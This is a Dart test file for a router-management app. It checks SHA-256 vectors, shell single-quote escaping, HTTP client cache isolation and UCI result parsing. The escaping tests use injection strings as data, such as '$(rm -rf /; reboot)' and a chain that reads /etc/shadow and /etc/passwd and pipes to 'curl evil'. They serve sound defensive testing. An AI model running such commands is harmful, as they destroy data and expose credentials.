// Copyright (C) 2026 @nightcodex7
// Copyright (C) 2025-2026 cogwheel0
// SPDX-License-Identifier: GPL-3.0-or-later

import 'dart:convert';
import 'package:flutter_test/flutter_test.dart';
import 'package:yala/services/api_service.dart';
import 'package:yala/utils/http_client_manager.dart';
import 'package:yala/utils/sha256.dart';

void main() {
  group('Security & Correctness Hardening Regression Suite', () {
    group('1. Local Pure-Dart Sha256 RFC Test Vectors', () {
      test('Empty string SHA-256 hash matches NIST standard', () {
        final hash = Sha256.hex([]);
        expect(
          hash,
          equals(
            'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
          ),
        );
      });

      test('NIST vector "abc" SHA-256 hash matches', () {
        final hash = Sha256.hex(utf8.encode('abc'));
        expect(
          hash,
          equals(
            'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad',
          ),
        );
      });

      test('Multi-block NIST vector matches', () {
        final hash = Sha256.hex(
          utf8.encode(
            'abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq',
          ),
        );
        expect(
          hash,
          equals(
            '248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1',
          ),
        );
      });
    });

    group('2. POSIX Shell Argument Escaping (Static Lease & Shell Paths)', () {
      test('Normal alphanumeric hostname is enclosed in single quotes', () {
        expect(
          RealApiService.shellSingleQuote('myhost123'),
          equals("'myhost123'"),
        );
      });

      test('Hyphenated hostname is safely quoted', () {
        expect(
          RealApiService.shellSingleQuote('living-room-pc'),
          equals("'living-room-pc'"),
        );
      });

      test('Underscore hostname is safely quoted', () {
        expect(
          RealApiService.shellSingleQuote('backup_server_01'),
          equals("'backup_server_01'"),
        );
      });

      test('Numeric hostname is safely quoted', () {
        expect(
          RealApiService.shellSingleQuote('19216811'),
          equals("'19216811'"),
        );
      });

      test(
        'Maximum-length 255-character hostname is preserved verbatim inside quotes',
        () {
          final longName = 'a' * 255;
          expect(
            RealApiService.shellSingleQuote(longName),
            equals("'$longName'"),
          );
        },
      );

      test(
        'Single quotes in input are escaped via closing and escaped quote',
        () {
          expect(
            RealApiService.shellSingleQuote("john's-pc"),
            equals("'john'\\''s-pc'"),
          );
        },
      );

      test('Double quotes and backticks cannot break out of single quotes', () {
        expect(
          RealApiService.shellSingleQuote('test" `reboot`'),
          equals("'test\" `reboot`'"),
        );
      });

      test('Command substitution syntax stays strictly literal', () {
        expect(
          RealApiService.shellSingleQuote(r'$(rm -rf /; reboot)'),
          equals(r"'$(rm -rf /; reboot)'"),
        );
      });

      test(
        'Shell metacharacters (;, &, |, >, <, newline, backslash) stay literal',
        () {
          const malicious =
              "host; rm -rf / & cat /etc/shadow | curl evil > /tmp/x < /etc/passwd\n\\\$";
          final quoted = RealApiService.shellSingleQuote(malicious);
          expect(quoted.startsWith("'"), isTrue);
          expect(quoted.endsWith("'"), isTrue);
          // The injection tokens are enclosed within single quotes without unescaped single quotes
          expect(quoted.contains("; rm -rf"), isTrue);
          expect(quoted, equals("'$malicious'"));
        },
      );

      test('Empty string is quoted as two single quotes', () {
        expect(RealApiService.shellSingleQuote(''), equals("''"));
      });

      test('Whitespace-only string is preserved within quotes', () {
        expect(RealApiService.shellSingleQuote('   '), equals("'   '"));
      });
    });

    group('3. HTTP Client Cache Eviction & Key Isolation', () {
      late HttpClientManager manager;

      setUp(() {
        manager = HttpClientManager();
        manager.disposeAll(forceCloseAdapter: true);
      });

      test(
        'Clients with matching IP prefix (192.168.1.1 vs 192.168.1.10) are isolated',
        () {
          final client1 = manager.getClient('192.168.1.1', false);
          final client10 = manager.getClient('192.168.1.10', false);
          final client100 = manager.getClient('192.168.1.100', false);
          final client2 = manager.getClient('192.168.1.2', false);

          expect(identical(client1, client10), isFalse);
          expect(identical(client1, client100), isFalse);
          expect(identical(client10, client100), isFalse);

          // Disposing 192.168.1.1 must NOT evict 192.168.1.10, 192.168.1.100, or 192.168.1.2
          manager.disposeClient('192.168.1.1', false);

          // Fetching 192.168.1.10 should return the SAME cached instance
          final cached10 = manager.getClient('192.168.1.10', false);
          expect(identical(client10, cached10), isTrue);

          final cached100 = manager.getClient('192.168.1.100', false);
          expect(identical(client100, cached100), isTrue);

          final cached2 = manager.getClient('192.168.1.2', false);
          expect(identical(client2, cached2), isTrue);

          // Fetching 192.168.1.1 should create a NEW client
          final newClient1 = manager.getClient('192.168.1.1', false);
          expect(identical(client1, newClient1), isFalse);
        },
      );

      test('HTTP and HTTPS clients for the same host are isolated', () {
        final httpClient = manager.getClient('192.168.1.1', false);
        final httpsClient = manager.getClient('192.168.1.1', true);

        expect(identical(httpClient, httpsClient), isFalse);

        // Disposing HTTP client must NOT evict HTTPS client
        manager.disposeClient('192.168.1.1', false);
        final cachedHttps = manager.getClient('192.168.1.1', true);
        expect(identical(httpsClient, cachedHttps), isTrue);
      });

      test('Different ports on same host are isolated in cache', () {
        final clientDefault = manager.getClient('192.168.1.1:80', false);
        final clientAlt = manager.getClient('192.168.1.1:8080', false);

        expect(identical(clientDefault, clientAlt), isFalse);

        // Disposing port 80 must NOT evict port 8080
        manager.disposeClient('192.168.1.1:80', false);
        final cachedAlt = manager.getClient('192.168.1.1:8080', false);
        expect(identical(clientAlt, cachedAlt), isTrue);
      });

      test('IPv6 bracketed hosts with similar prefixes are isolated', () {
        final clientV6_1 = manager.getClient('[fe80::1]', false);
        final clientV6_10 = manager.getClient('[fe80::10]', false);

        expect(identical(clientV6_1, clientV6_10), isFalse);

        manager.disposeClient('[fe80::1]', false);
        final cachedV6_10 = manager.getClient('[fe80::10]', false);
        expect(identical(clientV6_10, cachedV6_10), isTrue);
      });

      test(
        'clearCertificatesForHost removes only exact target host clients',
        () async {
          final client1 = manager.getClient('192.168.1.1', true);
          final client10 = manager.getClient('192.168.1.10', true);

          await manager.clearCertificatesForHost('192.168.1.1');

          // 192.168.1.10 must remain in cache
          final cached10 = manager.getClient('192.168.1.10', true);
          expect(identical(client10, cached10), isTrue);

          // 192.168.1.1 was evicted
          final newClient1 = manager.getClient('192.168.1.1', true);
          expect(identical(client1, newClient1), isFalse);
        },
      );
    });

    group('4. UCI Execution Success Check Verification', () {
      final api = RealApiService();

      test('List with code 0 indicates success', () {
        expect(api.isUciSuccessful([0]), isTrue);
        expect(
          api.isUciSuccessful([
            0,
            {'values': {}},
          ]),
          isTrue,
        );
      });

      test('List with non-zero exit code indicates failure', () {
        expect(api.isUciSuccessful([1]), isFalse);
        expect(api.isUciSuccessful([255]), isFalse);
      });

      test('Map with error field indicates failure', () {
        expect(api.isUciSuccessful({'error': 'UCI parse error'}), isFalse);
        expect(
          api.isUciSuccessful({
            'error': null,
            'result': [0],
          }),
          isTrue,
        );
      });

      test('Map with explicit success flag', () {
        expect(api.isUciSuccessful({'success': true}), isTrue);
        expect(api.isUciSuccessful({'success': false}), isFalse);
      });

      test('execSucceeded correctly interprets RPC result structures', () {
        expect(api.execSucceeded(null), isFalse);
        expect(api.execSucceeded([0]), isTrue);
        expect(api.execSucceeded([1]), isFalse);
        expect(
          api.execSucceeded([
            0,
            {'code': 0},
          ]),
          isTrue,
        );
        expect(
          api.execSucceeded([
            0,
            {'code': 1},
          ]),
          isFalse,
        );
        expect(api.execSucceeded({'code': 0}), isTrue);
        expect(api.execSucceeded({'code': 1}), isFalse);
        expect(api.execSucceeded({'rc': 0}), isTrue);
        expect(api.execSucceeded({'rc': 1}), isFalse);
      });
    });
  });
}
